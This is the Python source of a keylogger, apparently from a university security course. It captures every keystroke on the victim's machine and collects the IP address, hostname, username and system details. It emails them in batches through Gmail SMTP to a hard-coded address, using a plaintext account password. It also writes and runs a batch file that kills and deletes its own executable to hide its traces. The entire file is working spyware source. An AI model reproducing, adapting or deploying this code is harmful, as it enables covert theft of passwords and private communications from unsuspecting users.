from pynput import keyboard
import time
import smtplib
from os import remove, path
import subprocess
from sys import argv
import threading
import Queue
import socket
import getpass
import platform

destEmail = 'keylogsenderUIUC460@gmail.com' #Destination Email 
srcEmail = "keylogsenderUIUC460" #Emails will be sent from this email account 
srcPwd =  "qazwsxedcrfv"
dataBufferSize = 500 #Emails will be sent out after this many characters have been collected (note "[CTRL]" is 6 chars)

local = False #If this is True then keystrokes will be logged to file instead of email
exit_key = keyboard.Key.esc
end_program= False
data = ""
q = Queue.Queue()
holdDowns = ['Key.ctrl_l', 'Key.ctrl_r',
             'Key.shift', 'Key.shift_r',
             'Key.alt_l', 'Key.alt_r']

def filterKeys(letter):
	replacements = {
		'Key.space': ' ',
		'Key.ctrl_l': '[CTRL_L]',
		'Key.ctrl_r': '[CTRL_R]',
		'Key.shift': '[SHIFT_L]',
		'Key.shift_r': '[SHIFT_R]',
		'Key.alt_l': '[ALT_L]',
		'Key.alt_r': '[ALT_R]',
		'Key.caps_lock': '[CAPS_LOCK]',
		'Key.backspace': '[BACKSPACE]',
		'Key.enter': '[ENTER]\n',
		'Key.esc': '[ESC]',
		'Key.tab': '[TAB]',
		'Key.delete': '[DEL]',
		'Key.end': '[END]',
		'Key.home': '[HOME]',
		'Key.ins': '[INS]',
		'Key.page_up': '[PAGEUP]',
		'Key.page_down': '[PAGEDOWN]',
		'Key.cmd': '[WINDOWSKEY]',
		'Key.menu': '[MENU]',
                'Key.up': '[UP]',
                'Key.down': '[DOWN]',
                'Key.left': '[LEFT]',
                'Key.right': '[RIGHT]',
                'Key.f1': '[F1]',
                'Key.f2': '[F2]',
                'Key.f3': '[F3]',
                'Key.f4': '[F4]',
                'Key.f5': '[F5]',
                'Key.f6': '[F6]',
                'Key.f7': '[F7]',
                'Key.f8': '[F8]',
                'Key.f9': '[F9]',
                'Key.f10': '[F10]',
                'Key.f11': '[F11]',
                'Key.f12': '[F12]',
                
	}
	return replacements.get(letter,letter)

def serverSetup():
	global srcEmail, srcPwd
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(srcEmail, srcPwd)
	return server

def send_data(msg, victimInfo):
	try:
                IP = victimInfo.get('IP')
                HostName = victimInfo.get('Hostname')
                UserName = victimInfo.get('Username')
                Machine = victimInfo.get('Machine')
                
                #build message
                fullmsg =       ('\nSource IP: ' + str(IP) +
                                '\nHostName: ' + str(HostName) +
                                '\nUserName: ' + str(UserName) +
                                '\n\nSystem Info: \n\n' + str(Machine) +
                                '\n\n\n\n' + str(msg))
		print('Message: \n\n' + fullmsg)
		
		if(local):
			print('sending data through LOG FILE')
			f.write('{0}'.format(fullmsg))	
		else:
			print('sending data through EMAIL')
			server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, fullmsg)
		print("sending complete")
	except Exception as e:
		print('Exception: ' + str(e))
	
def recordKey(key, release=False):
		global data
		try:
			data += str(key.char)
		except AttributeError:
			data += filterKeys(str(key))
			print(filterKeys(str(key)))
			if(release):
				data+="<RELEASED>"
		except Exception as e:
			print('Exception: '+str(e))
		finally:
			if(len(data) > dataBufferSize):
				q.put(data)
				data = ""

def on_press(key):
	print(key)
	recordKey(key)

def on_release(key, release=True):
	global data, end_program
	if(key == exit_key): #exit
		end_program = True
		
		return False
	try:
		if(str(key) in holdDowns):
			recordKey(key, release=True)
	except Exception as e:
		print('Exception: '+ str(e))

def run_keylogger():
	#collect events until released
	with keyboard.Listener(
			on_press=on_press,
			on_release=on_release
			) as listener:

		try:
			listener.join()
		except Exception as e:
			print('Exception: '+str(e))

def capture_info():
        info = {}
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        victimIP = s.getsockname()[0]
        s.close()
        info['IP'] = victimIP

        info['Hostname'] = socket.gethostname()
        info['Username'] = getpass.getuser()
        info['Machine'] = (platform.machine() + '\n' +
                           platform.platform() + '\n' +
                           platform.system() + '\n' +
                           platform.processor())

        return info

def run_sender():
        victimInfo = capture_info();
        
	if(local):
		f = open('keylog.txt', 'w')
		print("logging to file...")
	else:
		print("logging to email...")
                global server 
                server = serverSetup()
	
	while(end_program==False):
		try:
			msg = q.get(block = True, timeout = 5)
			send_data(msg, victimInfo)
		except:#queue empty 
			continue

	#send any remaining data
        global data
        send_data(data, victimInfo)

	if(local):
		f.close()
	else:
		server.quit()

def selfDelete():
	#create selfdelete file
	BATTXT = ("@ECHO OFF\n"
		  +"SETLOCAL\n"
		  +"TASKKILL /IM \"keylogger.exe\"\n"
		  +"DEL \""+argv[0]+"\"\n"
		  +"DEL \"%~f0\"") 
	d = open("del.bat", 'w')
	d.write(BATTXT)
	d.close()
	
	#run selfdelete file on exe, shell=True makes it run in background
	subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat", shell=True) 

def main():
	thread_keylogger = threading.Thread(target = run_keylogger)
	thread_sender = threading.Thread(target = run_sender)

	thread_keylogger.start()	
	thread_sender.start()	
	
	thread_keylogger.join()
	thread_sender.join()	
	if(argv[0][-2:]!="py"):#so we don't acidentally delete the python file when testing
		selfDelete()

if __name__== "__main__":
	main()
